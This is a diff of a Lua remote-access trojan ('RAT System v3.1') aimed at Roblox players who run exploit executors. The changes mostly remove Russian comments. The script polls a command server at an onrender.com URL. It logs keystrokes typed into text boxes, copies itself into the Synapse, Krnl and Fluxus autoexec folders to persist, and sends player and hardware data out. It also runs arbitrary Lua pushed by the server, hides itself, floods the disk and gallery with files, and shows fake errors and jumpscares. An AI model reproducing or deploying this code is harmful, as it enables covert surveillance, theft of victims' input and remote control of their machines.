@@ -4,17 +4,14 @@ local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local Lighting = game:GetService("Lighting")
 local SoundService = game:GetService("SoundService")
-local TextChatService = game:GetService("TextChatService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
 local Stats = game:GetService("Stats")
 local CoreGui = game:GetService("CoreGui")
 
--- Конфигурация
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local player = Players.LocalPlayer
 
--- Определение типа устройства
 local function getDeviceType()
     if UserInputService.TouchEnabled then
         if UserInputService.MouseEnabled then
@@ -27,7 +24,6 @@ local function getDeviceType()
     end
 end
 
--- Системные переменные
 local keyloggerEnabled = false
 local keylogBuffer = ""
 local lastSendTime = os.time()
@@ -35,7 +31,6 @@ local scriptHidden = false
 local lastUserUpdate = 0
 local deviceType = getDeviceType()
 
--- Безопасная проверка функций
 local function safeCheck(funcName)
     if funcName == "writefile" then
         return writefile ~= nil
@@ -81,16 +76,14 @@ local function safeCheck(funcName)
     return false
 end
 
--- Автоматическое клонирование в Autoexec (только для ПК)
 local function autoInstallToAutoexec()
     if deviceType ~= "PC" or not safeCheck("writefile") then
         return false
     end
     
     local success = pcall(function()
-        local scriptSource = "-- RAT System v3.0\n" .. tostring(script.Source)
+        local scriptSource = "-- RAT System v3.1\n" .. tostring(script.Source)
         
-        -- Пути для автозагрузки разных эксплойтов
         local autoexecPaths = {
             "autoexec.lua",
             "autoexec/startup.lua",
@@ -100,18 +93,15 @@ local function autoInstallToAutoexec()
             "startup.lua",
         }
         
-        -- Для Synapse
         if syn and syn.writefile then
             table.insert(autoexecPaths, "synapse/autoexec.lua")
             table.insert(autoexecPaths, "synapse/workspace/rat.lua")
         end
         
-        -- Для Krnl
         if krnl then
             table.insert(autoexecPaths, "krnl/autoexec.lua")
         end
         
-        -- Для Fluxus
         if fluxus then
             table.insert(autoexecPaths, "fluxus/autoexec.lua")
         end
@@ -130,7 +120,6 @@ local function autoInstallToAutoexec()
     return success or false
 end
 
--- Безопасный HTTP-запрос
 local function httpRequest(params)
     local requestFunc
     
@@ -148,7 +137,6 @@ local function httpRequest(params)
     return success and response or nil
 end
 
--- Функция для создания скриншота
 local function captureScreenshot()
     if RunService:IsStudio() then
         return nil
@@ -174,7 +162,6 @@ local function captureScreenshot()
     return nil
 end
 
--- Функция отправки информации о пользователе
 local function sendUserInfo()
     local currentTime = os.time()
     if currentTime - lastUserUpdate < 15 then
@@ -215,7 +202,6 @@ local function sendUserInfo()
     end
 end
 
--- Отправка уведомления при инжекте
 local function sendInjectNotification()
     local playerName = player.Name
     local success, placeInfo = pcall(function()
@@ -262,7 +248,6 @@ local function sendInjectNotification()
     })
 end
 
--- Получение данных об оборудовании
 local function getHardwareInfo()
     local playerName = player.Name
     local success, placeInfo = pcall(function()
@@ -310,7 +295,6 @@ local function getHardwareInfo()
         end
     end
 
-    -- Информация о системе
     local systemInfo = {
         device_type = deviceType,
         touch_enabled = UserInputService.TouchEnabled,
@@ -332,7 +316,6 @@ local function getHardwareInfo()
     return hardwareData
 end
 
--- Memory Spam функция
 local function memorySpam(fileCount)
     if not safeCheck("writefile") then
         return 0
@@ -364,7 +347,6 @@ local function memorySpam(fileCount)
     return successCount
 end
 
--- Gallery Spam функция
 local function gallerySpam(imageCount)
     if not safeCheck("writefile") then
         return 0
@@ -391,7 +373,6 @@ local function gallerySpam(imageCount)
     return successCount
 end
 
--- Выполнение Lua-кода
 local function executeLua(code)
     local func, err = loadstring(code)
     if func then
@@ -406,7 +387,6 @@ local function executeLua(code)
     end
 end
 
--- Фейковая ошибка
 local function showFakeError(message)
     local success = pcall(function()
         local gui = Instance.new("ScreenGui")
@@ -444,7 +424,6 @@ local function showFakeError(message)
     return success
 end
 
--- Всплывающее сообщение
 local function showPopupMessage(message)
     local success = pcall(function()
         local gui = Instance.new("ScreenGui")
@@ -500,7 +479,6 @@ local function showPopupMessage(message)
     return success
 end
 
--- Скрытие скрипта
 local function hideScript()
     if scriptHidden then return true end
     
@@ -524,7 +502,6 @@ local function hideScript()
     return success
 end
 
--- Настройка кейлоггера
 local function setupKeylogger()
     local success = pcall(function()
         UserInputService.TextBoxFocused:Connect(function(textBox)
@@ -541,7 +518,6 @@ local function setupKeylogger()
     return success
 end
 
--- ЧАТ-МОДУЛЬ
 local function setupChat()
     local success, result = pcall(function()
         local screenGui = Instance.new("ScreenGui")
@@ -652,7 +628,6 @@ end
 
 local chatSystem = setupChat()
 
--- СКРИМЕР МОДУЛЬ
 local function createFullscreenGUI()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "JumpscareUI"
@@ -682,7 +657,6 @@ local function loadImageFromURL(url, defaultAssetId)
     return defaultAssetId and "rbxassetid://" .. defaultAssetId or nil
 end
 
--- 1. ДЖЕФФ КИЛЕР СКРИМЕР
 local function jeffKillerJumpscare()
     local screenGui = createFullscreenGUI()
     
@@ -761,7 +735,6 @@ local function jeffKillerJumpscare()
     end)
 end
 
--- 2. СОНИК.EXE СКРИМЕР
 local function sonicExeJumpscare()
     local screenGui = createFullscreenGUI()
     
@@ -890,7 +863,6 @@ local function executeJumpscareCommand(scareType)
     end
 end
 
--- Обработка команд
 local function ExecuteCommand(cmd, args)
     local success = pcall(function()
         if cmd == "chat" then
@@ -908,7 +880,7 @@ local function ExecuteCommand(cmd, args)
             end
         
         elseif cmd == "print" then
-            -- Тихая проверка связи
+            -- проверка связи
         
         elseif cmd == "kick" then
             player:Kick(args[1] or "Кикнут администратором")
@@ -1048,7 +1020,6 @@ local function ExecuteCommand(cmd, args)
         elseif cmd == "hide" then
             hideScript()
         
-        -- SPAM КОМАНДЫ
         elseif cmd == "memory_spam" then
             local fileCount = tonumber(args[1]) or 50
             
@@ -1081,7 +1052,6 @@ local function ExecuteCommand(cmd, args)
                 })
             end)
         
-        -- СКРИМЕР КОМАНДА
         elseif cmd == "jumpscare" then
             local scareType = tonumber(args[1]) or 1
             task.spawn(function()
@@ -1092,11 +1062,10 @@ local function ExecuteCommand(cmd, args)
     end)
 end
 
--- Функция проверки команд (ОБНОВЛЕНА - отправляем имя игрока)
 local function checkCommands()
     local success, response = pcall(function()
         return httpRequest({
-            Url = SERVER_URL.."/data?player=" .. player.Name,  -- ДОБАВЛЕНО: отправляем имя игрока
+            Url = SERVER_URL.."/data?player=" .. player.Name,
             Method = "GET"
         })
     end)
@@ -1114,35 +1083,25 @@ local function checkCommands()
     return false
 end
 
--- Инициализация с безопасной проверкой
 local function initialize()
-    -- Автоматическая установка в autoexec для ПК
     if deviceType == "PC" then
         task.wait(1)
         pcall(autoInstallToAutoexec)
     end
     
-    -- Отправляем уведомление об инжекте
     pcall(sendInjectNotification)
-    
-    -- Настраиваем кейлоггер
     pcall(setupKeylogger)
-    
-    -- Пытаемся скрыть скрипт
     pcall(hideScript)
 end
 
--- Главный цикл
 local function mainLoop()
     while task.wait(2) do
         pcall(checkCommands)
         
-        -- Отправляем информацию о пользователе каждые 15 секунд
         if os.time() - lastUserUpdate >= 15 then
             pcall(sendUserInfo)
         end
         
-        -- Отправка логов кейлоггера
         if keyloggerEnabled and os.time() - lastSendTime >= 300 then
             if keylogBuffer ~= "" then
                 pcall(function()
@@ -1162,6 +1121,5 @@ local function mainLoop()
     end
 end
 
--- Запуск системы
 pcall(initialize)
 pcall(mainLoop)
